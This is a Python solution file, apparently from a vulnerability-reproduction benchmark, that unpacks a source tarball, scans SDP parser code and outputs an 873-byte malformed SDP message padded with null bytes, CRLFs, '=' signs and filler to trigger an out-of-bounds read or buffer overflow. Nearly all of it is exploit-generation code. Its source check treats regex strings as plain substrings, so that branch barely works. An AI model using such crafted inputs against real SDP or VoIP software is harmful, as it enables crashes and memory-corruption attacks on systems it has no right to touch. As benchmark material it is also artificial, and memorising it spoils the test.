import os
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source code to analyze
        import tarfile
        import tempfile
        
        # Create a temporary directory to extract the source
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (assuming it's the first directory)
            root_dir = None
            for item in os.listdir(tmpdir):
                item_path = os.path.join(tmpdir, item)
                if os.path.isdir(item_path):
                    root_dir = item_path
                    break
            
            if not root_dir:
                return self._generate_fallback_poc()
            
            # Look for SDP-related files to understand the format
            sdp_files = self._find_sdp_files(root_dir)
            
            if sdp_files:
                # Analyze files to understand SDP structure
                return self._generate_targeted_poc(sdp_files)
            else:
                # Fallback to generic SDP PoC
                return self._generate_generic_poc()
    
    def _find_sdp_files(self, root_dir):
        """Find SDP-related source files"""
        sdp_files = []
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')) and 'sdp' in file.lower():
                    sdp_files.append(os.path.join(root, file))
        return sdp_files
    
    def _analyze_sdp_format(self, sdp_files):
        """Analyze SDP format from source files"""
        # Look for patterns in SDP parsing
        keywords = ['value', 'end', 'length', 'size', 'parse', 'sdp']
        findings = []
        
        for file_path in sdp_files:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Look for potential vulnerable patterns
                    lines = content.split('\n')
                    for i, line in enumerate(lines):
                        if any(keyword in line.lower() for keyword in keywords):
                            # Check next few lines for potential issues
                            context = '\n'.join(lines[max(0, i-2):min(len(lines), i+3)])
                            findings.append((file_path, i+1, context))
            except:
                continue
        
        return findings
    
    def _generate_targeted_poc(self, sdp_files):
        """Generate targeted PoC based on analysis"""
        findings = self._analyze_sdp_format(sdp_files)
        
        # Look for specific patterns related to the vulnerability
        vulnerable_patterns = [
            'while.*value',
            'for.*value',
            'strlen.*value',
            'memcpy.*value',
            'strcpy.*value'
        ]
        
        for file_path, line_num, context in findings:
            context_lower = context.lower()
            if any(pattern in context_lower for pattern in vulnerable_patterns):
                # Found potential vulnerability pattern
                return self._create_crafted_sdp()
        
        # Default to generic if no specific pattern found
        return self._generate_generic_poc()
    
    def _create_crafted_sdp(self):
        """Create a crafted SDP that triggers buffer overflow"""
        # SDP format with malformed value to trigger buffer overflow
        sdp_template = """v=0
o=- 0 0 IN IP4 127.0.0.1
s=Test Session
c=IN IP4 0.0.0.0
t=0 0
m=audio 5004 RTP/AVP 0
a=rtpmap:0 PCMU/8000
a={overflow_field}
"""
        
        # Create a value field that's likely to cause overflow
        # The vulnerability is about not checking if we're before end of value
        # So we need to craft a value that when parsed incorrectly, causes OOB read
        
        # Method: Create a long value field with embedded nulls and special characters
        # that might confuse the parser about where the value ends
        
        # Start with a normal-looking attribute
        overflow_value = "sendrecv"
        
        # Add padding to reach target length (873 bytes total PoC)
        # Calculate padding needed
        base_length = len(sdp_template.format(overflow_field=""))
        padding_needed = 873 - base_length - len(overflow_value)
        
        if padding_needed > 0:
            # Create padding with pattern that might trigger overflow
            # Use characters that could be misinterpreted as delimiters
            padding = "\x00" * (padding_needed // 3)  # Null bytes
            padding += "\r\n" * (padding_needed // 6)  # Newlines (might be ignored)
            padding += "=" * (padding_needed // 3)  # Equals signs
            padding += " " * (padding_needed - len(padding))  # Spaces to fill
            
            overflow_value += padding
        
        sdp_data = sdp_template.format(overflow_field=overflow_value)
        
        # Ensure exact length
        if len(sdp_data) < 873:
            sdp_data += " " * (873 - len(sdp_data))
        elif len(sdp_data) > 873:
            sdp_data = sdp_data[:873]
        
        return sdp_data.encode('utf-8', errors='ignore')
    
    def _generate_generic_poc(self):
        """Generate generic SDP PoC that might trigger heap overflow"""
        # Create an SDP with a very long attribute value
        # This is a common pattern for triggering buffer overflows in parsers
        
        sdp_base = """v=0
o=- 0 0 IN IP4 127.0.0.1
s=Vulnerability Test
c=IN IP4 0.0.0.0
t=0 0
m=audio 5004 RTP/AVP 0
a=rtpmap:0 PCMU/8000
a=sendrecv
"""
        
        # Add padding to reach target length
        padding_len = 873 - len(sdp_base)
        
        if padding_len > 0:
            # Create padding that includes various delimiters that might confuse parser
            # Mix of null bytes, newlines, and equals signs
            padding = ""
            
            # Add null bytes (might cause string functions to stop early)
            null_count = min(50, padding_len // 4)
            padding += "\x00" * null_count
            
            # Add newlines (might be treated as line endings)
            newline_count = min(30, (padding_len - len(padding)) // 3)
            padding += "\r\n" * (newline_count // 2)
            
            # Add equals signs (key=value delimiter in SDP)
            equals_count = min(20, (padding_len - len(padding)) // 2)
            padding += "=" * equals_count
            
            # Fill rest with 'A's
            remaining = padding_len - len(padding)
            if remaining > 0:
                padding += "A" * remaining
            
            # Insert padding into an attribute value
            sdp_data = sdp_base.rstrip() + "\na=" + padding + "\n"
        else:
            sdp_data = sdp_base
        
        # Trim or pad to exact length
        sdp_bytes = sdp_data.encode('utf-8', errors='ignore')
        
        if len(sdp_bytes) < 873:
            sdp_bytes += b"A" * (873 - len(sdp_bytes))
        elif len(sdp_bytes) > 873:
            sdp_bytes = sdp_bytes[:873]
        
        return sdp_bytes
    
    def _generate_fallback_poc(self):
        """Generate fallback PoC when no source analysis is possible"""
        # Simple SDP with long value field
        sdp = """v=0
o=- 0 0 IN IP4 127.0.0.1
s=Test
c=IN IP4 0.0.0.0
t=0 0
m=audio 5004 RTP/AVP 0
a=rtpmap:0 PCMU/8000
a=sendrecv
"""
        
        # Add very long value to potentially trigger overflow
        value = "x" * 800
        
        sdp_data = sdp + "a=" + value
        
        # Ensure exact length
        sdp_bytes = sdp_data.encode('utf-8', errors='ignore')
        
        if len(sdp_bytes) < 873:
            sdp_bytes += b"B" * (873 - len(sdp_bytes))
        elif len(sdp_bytes) > 873:
            sdp_bytes = sdp_bytes[:873]
        
        return sdp_bytes
